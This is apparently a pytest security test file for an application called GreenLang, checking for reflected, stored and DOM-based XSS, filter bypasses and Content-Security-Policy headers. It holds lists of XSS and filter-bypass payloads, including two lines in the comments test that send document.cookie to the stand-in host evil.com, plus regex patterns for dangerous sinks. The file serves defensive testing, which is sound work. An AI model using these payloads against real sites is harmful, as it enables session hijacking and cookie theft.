# -*- coding: utf-8 -*-
"""
Cross-Site Scripting (XSS) Tests for GreenLang

Tests for XSS vulnerabilities:
- Reflected XSS
- Stored XSS
- DOM-based XSS
- XSS filter bypass techniques

Author: GreenLang Test Engineering
Date: December 2025
"""

import pytest
import json
import re
import html
from typing import Dict, Any, List
from datetime import datetime

from .conftest import (
    SecurityTestClient,
    PayloadGenerator,
    SecurityValidator,
    SecurityTestResult,
    SecurityFinding,
    SecurityTestSeverity,
    SecurityTestStatus,
    MockHTTPResponse,
)


# ==============================================================================
# Reflected XSS Tests
# ==============================================================================

class TestReflectedXSS:
    """Test reflected XSS vulnerabilities."""

    @pytest.mark.security
    @pytest.mark.xss
    def test_reflected_xss_in_search(
        self,
        security_client: SecurityTestClient,
        payload_generator: PayloadGenerator,
        security_validator: SecurityValidator,
    ):
        """
        Test: Reflected XSS in search functionality

        Attack: XSS payloads in search query parameters.
        Expected: Search terms should be HTML-encoded in response.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="reflected_xss_search",
            status=SecurityTestStatus.PASSED,
        )

        for payload in payload_generator.xss_payloads()[:10]:
            response = security_client.get(
                "/api/v1/search",
                params={"q": payload},
            )

            # Check if payload is reflected without encoding
            if security_validator.check_xss_vulnerability(response):
                result.status = SecurityTestStatus.FAILED
                result.add_finding(SecurityFinding(
                    finding_id="XSS-001",
                    title="Reflected XSS in Search",
                    description="Search parameter reflects XSS payload without encoding",
                    severity=SecurityTestSeverity.HIGH,
                    category="XSS",
                    affected_component="/api/v1/search",
                    evidence=f"Payload reflected: {payload[:30]}...",
                    remediation="HTML-encode all user input in responses",
                    cwe_id="CWE-79",
                    cvss_score=6.1,
                ))
                break

        assert result.status == SecurityTestStatus.PASSED

    @pytest.mark.security
    @pytest.mark.xss
    def test_reflected_xss_in_error_messages(
        self,
        security_client: SecurityTestClient,
        payload_generator: PayloadGenerator,
    ):
        """
        Test: Reflected XSS in error messages

        Attack: XSS payloads that appear in error responses.
        Expected: Error messages should not reflect unencoded user input.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="reflected_xss_errors",
            status=SecurityTestStatus.PASSED,
        )

        xss_payloads = [
            "<script>alert(1)</script>",
            "'-alert(1)-'",
            "<img src=x onerror=alert(1)>",
        ]

        for payload in xss_payloads:
            # Trigger error with XSS payload in parameter
            response = security_client.get(
                f"/api/v1/calculations/{payload}",
            )

            # Check if error message reflects payload
            if response.status_code >= 400:
                if payload in response.text and "<script>" in response.text:
                    result.status = SecurityTestStatus.FAILED
                    result.add_finding(SecurityFinding(
                        finding_id="XSS-002",
                        title="Reflected XSS in Error Message",
                        description="Error response reflects XSS payload",
                        severity=SecurityTestSeverity.HIGH,
                        category="XSS",
                        affected_component="Error Handler",
                        evidence=f"Payload in error: {payload[:30]}...",
                        remediation="Encode user input in error messages",
                        cwe_id="CWE-79",
                        cvss_score=6.1,
                    ))
                    break

        assert result.status == SecurityTestStatus.PASSED

    @pytest.mark.security
    @pytest.mark.xss
    def test_xss_in_url_parameters(
        self,
        security_client: SecurityTestClient,
    ):
        """
        Test: XSS in various URL parameters

        Attack: XSS payloads in different query parameters.
        Expected: All parameters should be properly encoded.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="xss_url_parameters",
            status=SecurityTestStatus.PASSED,
        )

        vulnerable_params = [
            ("callback", "<script>alert(1)</script>"),
            ("redirect", "javascript:alert(1)"),
            ("next", "<img src=x onerror=alert(1)>"),
            ("name", "'\"><script>alert(1)</script>"),
            ("message", "<svg onload=alert(1)>"),
        ]

        for param_name, payload in vulnerable_params:
            response = security_client.get(
                "/api/v1/page",
                params={param_name: payload},
            )

            # Check for unencoded XSS in response
            if payload in response.text:
                result.status = SecurityTestStatus.FAILED
                result.add_finding(SecurityFinding(
                    finding_id="XSS-003",
                    title=f"XSS in {param_name} Parameter",
                    description=f"Parameter '{param_name}' vulnerable to XSS",
                    severity=SecurityTestSeverity.HIGH,
                    category="XSS",
                    affected_component=f"/api/v1/page?{param_name}=",
                    evidence=f"Payload: {payload[:30]}...",
                    remediation="Encode all URL parameter values",
                    cwe_id="CWE-79",
                    cvss_score=6.1,
                ))
                break

        assert result.status == SecurityTestStatus.PASSED


# ==============================================================================
# Stored XSS Tests
# ==============================================================================

class TestStoredXSS:
    """Test stored XSS vulnerabilities."""

    @pytest.mark.security
    @pytest.mark.xss
    def test_stored_xss_in_user_profile(
        self,
        security_client: SecurityTestClient,
        payload_generator: PayloadGenerator,
    ):
        """
        Test: Stored XSS in user profile fields

        Attack: XSS payloads stored in profile and rendered to other users.
        Expected: Profile data should be encoded when rendered.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="stored_xss_profile",
            status=SecurityTestStatus.PASSED,
        )

        xss_payloads = payload_generator.xss_payloads()[:5]

        for payload in xss_payloads:
            # Store XSS in profile
            security_client.put(
                "/api/v1/users/profile",
                json_data={
                    "display_name": payload,
                    "bio": payload,
                    "website": f"javascript:{payload}",
                },
                headers={"Authorization": "Bearer test_token"},
            )

            # Retrieve profile (simulating another user viewing)
            response = security_client.get("/api/v1/users/1/profile")

            if payload in response.text and not html.escape(payload) in response.text:
                result.status = SecurityTestStatus.FAILED
                result.add_finding(SecurityFinding(
                    finding_id="XSS-004",
                    title="Stored XSS in User Profile",
                    description="User profile stores and renders XSS payload",
                    severity=SecurityTestSeverity.HIGH,
                    category="XSS",
                    affected_component="User Profile",
                    evidence=f"Payload stored: {payload[:30]}...",
                    remediation="Encode all stored user data when rendering",
                    cwe_id="CWE-79",
                    cvss_score=6.5,
                ))
                break

        assert result.status == SecurityTestStatus.PASSED

    @pytest.mark.security
    @pytest.mark.xss
    def test_stored_xss_in_comments(self, security_client: SecurityTestClient):
        """
        Test: Stored XSS in comments/notes

        Attack: XSS payloads in user-submitted comments.
        Expected: Comments should be sanitized before storage and display.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="stored_xss_comments",
            status=SecurityTestStatus.PASSED,
        )

        comment_payloads = [
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src=x onerror=\"fetch('http://evil.com/?c='+document.cookie)\">",
            "<a href=\"javascript:alert(document.domain)\">Click me</a>",
            "<div onmouseover=\"alert(1)\">Hover me</div>",
        ]

        for payload in comment_payloads:
            # Post comment
            security_client.post(
                "/api/v1/calculations/123/comments",
                json_data={"text": payload},
                headers={"Authorization": "Bearer test_token"},
            )

            # View comments
            response = security_client.get("/api/v1/calculations/123/comments")

            # Check if XSS is rendered
            dangerous_patterns = [
                r"<script>",
                r"onerror\s*=",
                r"onmouseover\s*=",
                r"javascript:",
            ]

            for pattern in dangerous_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    result.status = SecurityTestStatus.FAILED
                    result.add_finding(SecurityFinding(
                        finding_id="XSS-005",
                        title="Stored XSS in Comments",
                        description="Comments render XSS payload",
                        severity=SecurityTestSeverity.HIGH,
                        category="XSS",
                        affected_component="Comments",
                        evidence=f"Dangerous pattern: {pattern}",
                        remediation="Sanitize HTML in comments, use allowlist",
                        cwe_id="CWE-79",
                        cvss_score=6.5,
                    ))
                    break

        assert result.status == SecurityTestStatus.PASSED

    @pytest.mark.security
    @pytest.mark.xss
    def test_stored_xss_in_calculation_names(self, security_client: SecurityTestClient):
        """
        Test: Stored XSS in calculation names/descriptions

        Attack: XSS in calculation metadata that's displayed.
        Expected: Calculation names should be encoded.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="stored_xss_calculations",
            status=SecurityTestStatus.PASSED,
        )

        # Create calculation with XSS payload in name
        payload = "<script>alert('XSS')</script>"
        security_client.post(
            "/api/v1/calculations",
            json_data={
                "name": payload,
                "description": f"Test {payload} description",
                "fuel_type": "natural_gas",
                "quantity": 1000,
            },
        )

        # List calculations
        response = security_client.get("/api/v1/calculations")

        if "<script>" in response.text:
            result.status = SecurityTestStatus.FAILED
            result.add_finding(SecurityFinding(
                finding_id="XSS-006",
                title="Stored XSS in Calculation Names",
                description="Calculation names render XSS payload",
                severity=SecurityTestSeverity.HIGH,
                category="XSS",
                affected_component="Calculations List",
                evidence="Script tag found in response",
                remediation="Encode calculation names in all views",
                cwe_id="CWE-79",
                cvss_score=6.5,
            ))

        assert result.status == SecurityTestStatus.PASSED


# ==============================================================================
# DOM-Based XSS Tests
# ==============================================================================

class TestDOMBasedXSS:
    """Test DOM-based XSS vulnerabilities."""

    @pytest.mark.security
    @pytest.mark.xss
    def test_dom_xss_hash_fragment(self, security_client: SecurityTestClient):
        """
        Test: DOM-based XSS via URL hash fragment

        Attack: XSS payloads in URL hash that's processed by JavaScript.
        Expected: Hash values should be safely processed.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="dom_xss_hash",
            status=SecurityTestStatus.PASSED,
        )

        # Note: DOM XSS testing requires JavaScript execution
        # This test checks if the server returns JavaScript that
        # unsafely processes URL hash

        response = security_client.get("/app/dashboard")

        # Check for dangerous patterns in JavaScript
        dangerous_patterns = [
            r"location\.hash",
            r"document\.URL",
            r"document\.location",
            r"innerHTML\s*=.*location",
            r"eval\s*\(",
            r"document\.write\s*\(",
        ]

        found_patterns = []
        for pattern in dangerous_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                found_patterns.append(pattern)

        if found_patterns:
            result.add_finding(SecurityFinding(
                finding_id="XSS-007",
                title="Potential DOM XSS Sinks",
                description="JavaScript contains potentially dangerous DOM operations",
                severity=SecurityTestSeverity.MEDIUM,
                category="XSS",
                affected_component="Frontend JavaScript",
                evidence=f"Patterns found: {', '.join(found_patterns)}",
                remediation="Review and sanitize DOM operations",
                cwe_id="CWE-79",
                cvss_score=5.4,
            ))

        # Mock test passes (manual review needed for DOM XSS)
        assert True

    @pytest.mark.security
    @pytest.mark.xss
    def test_postmessage_xss(self, security_client: SecurityTestClient):
        """
        Test: DOM XSS via postMessage

        Check: JavaScript event handlers that accept postMessage data.
        Expected: postMessage origin and data should be validated.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="postmessage_xss",
            status=SecurityTestStatus.PASSED,
        )

        response = security_client.get("/app/main.js")

        # Check for unsafe postMessage handling
        if "addEventListener" in response.text and "message" in response.text:
            # Check if origin is validated
            if "origin" not in response.text.lower():
                result.add_finding(SecurityFinding(
                    finding_id="XSS-008",
                    title="Unsafe postMessage Handler",
                    description="postMessage handler may not validate origin",
                    severity=SecurityTestSeverity.MEDIUM,
                    category="XSS",
                    affected_component="JavaScript postMessage",
                    evidence="message event listener found without origin check",
                    remediation="Always validate event.origin in postMessage handlers",
                    cwe_id="CWE-79",
                    cvss_score=5.4,
                ))

        assert result.status == SecurityTestStatus.PASSED


# ==============================================================================
# XSS Filter Bypass Tests
# ==============================================================================

class TestXSSFilterBypass:
    """Test XSS filter bypass techniques."""

    @pytest.mark.security
    @pytest.mark.xss
    def test_xss_filter_bypass_encoding(self, security_client: SecurityTestClient):
        """
        Test: XSS filter bypass using various encodings

        Attack: URL encoding, HTML entities, Unicode to bypass filters.
        Expected: Filters should handle all encoding variations.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="xss_filter_bypass_encoding",
            status=SecurityTestStatus.PASSED,
        )

        bypass_payloads = [
            # URL encoding
            "%3Cscript%3Ealert(1)%3C/script%3E",
            # Double URL encoding
            "%253Cscript%253Ealert(1)%253C/script%253E",
            # HTML entities
            "&lt;script&gt;alert(1)&lt;/script&gt;",
            # Unicode
            "\u003cscript\u003ealert(1)\u003c/script\u003e",
            # Mixed case
            "<ScRiPt>alert(1)</ScRiPt>",
            # Null byte injection
            "<scr\x00ipt>alert(1)</script>",
            # Tab/newline injection
            "<script\t>alert(1)</script>",
            "<script\n>alert(1)</script>",
        ]

        for payload in bypass_payloads:
            response = security_client.get(
                "/api/v1/search",
                params={"q": payload},
            )

            # Check if any form of script tag gets through
            if re.search(r"<\s*script", response.text, re.IGNORECASE):
                result.status = SecurityTestStatus.FAILED
                result.add_finding(SecurityFinding(
                    finding_id="XSS-009",
                    title="XSS Filter Bypass",
                    description="XSS filter bypassed with encoding",
                    severity=SecurityTestSeverity.HIGH,
                    category="XSS",
                    affected_component="XSS Filter",
                    evidence=f"Bypass payload: {payload[:30]}...",
                    remediation="Use robust encoding library, context-aware escaping",
                    cwe_id="CWE-79",
                    cvss_score=6.1,
                ))
                break

        assert result.status == SecurityTestStatus.PASSED

    @pytest.mark.security
    @pytest.mark.xss
    def test_xss_filter_bypass_tag_variations(self, security_client: SecurityTestClient):
        """
        Test: XSS filter bypass using tag variations

        Attack: Alternative HTML tags and event handlers.
        Expected: All dangerous tags and events should be blocked.
        CWE-79: Cross-site Scripting (XSS)
        """
        result = SecurityTestResult(
            test_name="xss_filter_bypass_tags",
            status=SecurityTestStatus.PASSED,
        )

        tag_payloads = [
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<img src=x onerror=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        ]

        for payload in tag_payloads:
            response = security_client.post(
                "/api/v1/notes",
                json_data={"content": payload},
            )

            # Check if dangerous patterns exist in response
            dangerous = re.search(
                r"on\w+\s*=|javascript:|<script|<iframe|<embed|<object",
                response.text,
                re.IGNORECASE,
            )

            if dangerous:
                result.status = SecurityTestStatus.FAILED
                result.add_finding(SecurityFinding(
                    finding_id="XSS-010",
                    title="XSS Filter Bypass via Alternative Tags",
                    description="Alternative XSS vector not filtered",
                    severity=SecurityTestSeverity.HIGH,
                    category="XSS",
                    affected_component="Content Filter",
                    evidence=f"Payload: {payload[:30]}...",
                    remediation="Use comprehensive HTML sanitizer library",
                    cwe_id="CWE-79",
                    cvss_score=6.1,
                ))
                break

        assert result.status == SecurityTestStatus.PASSED


# ==============================================================================
# Content Security Policy Tests
# ==============================================================================

class TestContentSecurityPolicy:
    """Test Content Security Policy implementation."""

    @pytest.mark.security
    @pytest.mark.xss
    def test_csp_header_present(self, security_client: SecurityTestClient):
        """
        Test: Content-Security-Policy header presence

        Check: CSP header is present and properly configured.
        Expected: CSP should be set with restrictive policy.
        CWE-1021: Improper Restriction of Rendered UI Layers
        """
        result = SecurityTestResult(
            test_name="csp_header_present",
            status=SecurityTestStatus.PASSED,
        )

        response = security_client.get("/app/dashboard")

        csp = response.headers.get("Content-Security-Policy", "")
        csp_report = response.headers.get("Content-Security-Policy-Report-Only", "")

        if not csp and not csp_report:
            result.add_finding(SecurityFinding(
                finding_id="XSS-011",
                title="Missing Content-Security-Policy",
                description="CSP header not present",
                severity=SecurityTestSeverity.MEDIUM,
                category="XSS",
                affected_component="HTTP Headers",
                evidence="No CSP header in response",
                remediation="Implement Content-Security-Policy header",
                cwe_id="CWE-1021",
                cvss_score=5.3,
            ))

        # Check for unsafe CSP directives
        if "unsafe-inline" in csp or "unsafe-eval" in csp:
            result.add_finding(SecurityFinding(
                finding_id="XSS-012",
                title="Weak Content-Security-Policy",
                description="CSP allows unsafe-inline or unsafe-eval",
                severity=SecurityTestSeverity.MEDIUM,
                category="XSS",
                affected_component="CSP Configuration",
                evidence=f"CSP: {csp[:100]}...",
                remediation="Remove unsafe-inline and unsafe-eval from CSP",
                cwe_id="CWE-1021",
                cvss_score=5.3,
            ))

        assert result.status == SecurityTestStatus.PASSED


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-m", "xss"])
